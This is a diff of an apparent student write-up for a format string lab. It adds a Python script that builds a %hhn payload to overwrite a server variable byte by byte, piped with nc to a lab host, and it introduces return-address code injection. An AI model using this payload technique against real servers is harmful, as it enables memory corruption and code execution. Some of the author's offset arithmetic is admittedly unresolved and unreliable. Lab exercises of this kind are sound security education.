@@ -169,6 +169,7 @@ echo %s | nc -w5 10.9.0.5 9090
 
 We can tell that the format program has crashed because it did not print out "Returned properly" and a few smiley faces.
 
+
 <br>
 
 ### Printing Out the Server Program’s Memory
@@ -244,6 +245,7 @@ cat badfile | nc -w2 10.9.0.5 9090
 ```
 
 **image**
+
 
 <br>
 
@@ -421,7 +423,7 @@ Our program is a 32-bit program so our address is a 4-byte address. Our machine 
 - 0x080e5068 => 0xDD
 - 0x080e5069 => 0xCC
 - 0x080e506a => 0xBB
-- 0x080e506b => 0xBB
+- 0x080e506b => 0xAA
 
 The values written are cummulative, so when constructing our string, we have to start with the addresses that will store lower values.
 
@@ -431,18 +433,101 @@ For this task, I need to determine the total number of characters I would need t
 - 0xCC = 204
 - 0xDD = 221
 - The offset is 64, and will contain multiple format specifiers:
-  - we need one for the %hn% format specifier for the first address
+  - we need one for the %hhn% format specifier for the first address
   - we need one for the %x modulo precision modifier for the first address
   - we need 64 - 2 for the %x whole number precision modifier for the first address
-- The string will start with the address that will contain a lower value, appended by 4-bytes of random data to account for the %x specifier that will be used for the second address and finally the address that will contain a higher value. This is a total of 12-bytes.
-- The first address will store a lower value which is 0xAABB (43707). The first 12 bytes are where I would store the target variable's addresses.
-  - 43707 - 12 = 43695
+- The string will be built as: lower value address +  4-bytes of random data to account for the %x specifier that will be used for the second address + next higher value address + 4-bytes of random data to account for the %x specifier that will be used for the third address + next higher value address + 4-bytes of random data to account for the %x specifier that will be used for the fouth address + the highest value address. This is a total of 28-bytes.
+- The first address will store a lower value which is 0xAA (170). The first 28 bytes are where I would store the target variable's addresses.
+  - 170 - 28 = 142
 - The whole number %x precision modifier for the first address is:
-  - 43695 // 62 = 704
+  - 142 // 62 = 2
 - The modulo number %x precision modifier for the first address is:
-  - 43695 % 62 = 47
-- The second address will store a higher value which is 0xCCDD (52445). To determine the number of %x precision modifiers to use, we would subtract 0xAABB form 0xCCCC:
-  - 0xCCDD - 0xAABB = 52445 - 43707 = 8738
+  - 142 % 62 = 18
+- The second address will store a higher value which is 0xBB.
+  - 0xBB - 0xAA = 17
+- The third address will store a higher value which is 0xCC.
+  - 0xCC - 0xBB = 17
+- The last address will store a higher value which is 0xDD.
+  - 0xDD - 0xCC = 17
+
+<details>
+<summary>notes</summary>
+<div markdown="1">
+
+For some reasons not yet known to me, putting the value of 170 in 0x080e506b does not produce the intended outcome which is 0xaa. I find that I have to increase the value I put in 0x080e506b. 
+After some tinkering, I was able to determine that putting the value of 285 in 0x080e506b produces 0xaa. Every other thing works as expected.
+
+I am yet to determine why this happens.
+</div></details>
+
+
+```python
+#!/usr/bin/python3
+import sys
+
+# Start input with the memory address that will store a lower value
+content = (0x080e506b).to_bytes(4,byteorder='little')
+
+# Append 4-bytes to account for writing to the second memory address
+content += ("@@@@").encode('latin-1')
+
+# Append the next memory address
+content += (0x080e506a).to_bytes(4,byteorder='little')
+
+# Append 4-bytes to account for writing to the third memory address
+content += ("@@@@").encode('latin-1')
+
+# Append the next memory address
+content += (0x080e5069).to_bytes(4,byteorder='little')
+
+# Append 4-bytes to account for writing to the fourth memory address
+content += ("@@@@").encode('latin-1')
+
+# Append the memory address that will store a highest value
+content += (0x080e5068).to_bytes(4,byteorder='little')
+
+# Append format specifiers to prevent the program from crashing, access 0x080e506b and overwrite it's content
+content += ("%.2x" * 62).encode('latin-1')
+content += ("%.133x%hhn").encode('latin-1')
+
+# Append format specifiers to prevent the program from crashing, access 0x080e506b and overwrite it's content
+content += ("%.17x%hhn").encode('latin-1')
+
+# Append format specifiers to prevent the program from crashing, access 0x080e506b and overwrite it's content
+content += ("%.17x%hhn").encode('latin-1')
+
+# Append format specifiers to prevent the program from crashing, access 0x080e506b and overwrite it's content
+content += ("%.17x%hhn").encode('latin-1')
+
+# Append a newline
+content += ("\n").encode('latin-1')
+
+
+# Write the content to badfile
+with open('badfile', 'wb') as f:
+  print(f"writing {len(content)} bytes to badfile...")
+  f.write(content)
+```
+
+```bash
+python3 badfile.py
+cat badfile | nc -w2 10.9.0.5 9090
+```
+
+**image**
+
+
+<br>
+
+### Inject Malicious Code into the Server Program
+
+This task involves injecting a piece of malicious code, in its binary format, into the server’s memory, and then use the format string vulnerability
+to modify the return address field of a function, so when the function returns, it jumps to our injected code.
+
+The technique used for this task is similar to that in the previous task: they both modify a 4-byte number in the memory. The previous task modifies the target variable, while this task modifies the return
+address field of a function. Students need to figure out the address for the return-address field based on the
+information printed out by the server.
+
 
 
 
